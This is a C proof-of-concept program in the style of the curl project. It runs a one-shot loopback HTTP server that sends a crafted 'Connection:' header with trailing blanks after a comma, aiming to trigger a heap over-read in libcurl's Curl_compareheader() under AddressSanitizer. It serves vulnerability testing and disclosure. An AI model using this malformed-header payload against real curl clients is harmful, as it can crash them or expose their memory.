/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___ | | | |  _ \| |
 *                             / __| | | | |_) | |
 *                            | (__| |_| |  _ <| |___
 *                             \___|\___/|_| \_\_____|
 *
 * PoC: drive a crafted HTTP response header through libcurl's public API.
 * A "Connection:" header value that ends with blanks after the last comma
 * makes Curl_compareheader() scan for the next comma past the end of the
 * heap buffer that holds the header line.
 *
 * Link against an AddressSanitizer build of libcurl and run.
 * SPDX-License-Identifier: curl
 ***************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>

#define TRAILING_BLANKS 512

static void serve_one(int lfd)
{
  char resp[1024];
  int cfd;
  ssize_t rc;
  int off;

  alarm(30); /* do not linger if no client connects */
  cfd = accept(lfd, NULL, NULL);
  if(cfd < 0)
    _exit(1);

  off = snprintf(resp, sizeof(resp), "HTTP/1.1 200 OK\r\n"
                 "Connection: keep-alive, ,");
  memset(resp + off, ' ', TRAILING_BLANKS);
  off += TRAILING_BLANKS;
  off += snprintf(resp + off, sizeof(resp) - (size_t)off,
                  "\r\nContent-Length: 0\r\n\r\n");
  rc = write(cfd, resp, (size_t)off);
  (void)rc;
  close(cfd);
  _exit(0);
}

int main(void)
{
  const char *url;
  int lfd;
  uint16_t port;
  struct sockaddr_in addr;
  socklen_t alen = sizeof(addr);
  CURLcode rc;
  CURL *curl;
  char urlobj[64];

  signal(SIGCHLD, SIG_IGN); /* auto-reap the server child */

  lfd = socket(AF_INET, SOCK_STREAM, 0);
  if(lfd < 0)
    return 1;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  if(bind(lfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    return 1;
  if(listen(lfd, 1) < 0)
    return 1;
  if(getsockname(lfd, (struct sockaddr *)&addr, &alen) < 0)
    return 1;
  port = ntohs(addr.sin_port);

  if(fork() == 0) {
    serve_one(lfd); /* child serves one request, then exits */
  }
  close(lfd); /* parent needs no socket access beyond libcurl */

  snprintf(urlobj, sizeof(urlobj), "http://127.0.0.1:%u/", (unsigned)port);
  url = urlobj;

  curl = curl_easy_init();
  if(!curl)
    return 1;
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
  rc = curl_easy_perform(curl);
  curl_easy_cleanup(curl);
  printf("perform returned %d (%s)\n", (int)rc, curl_easy_strerror(rc));

  return 0;
}
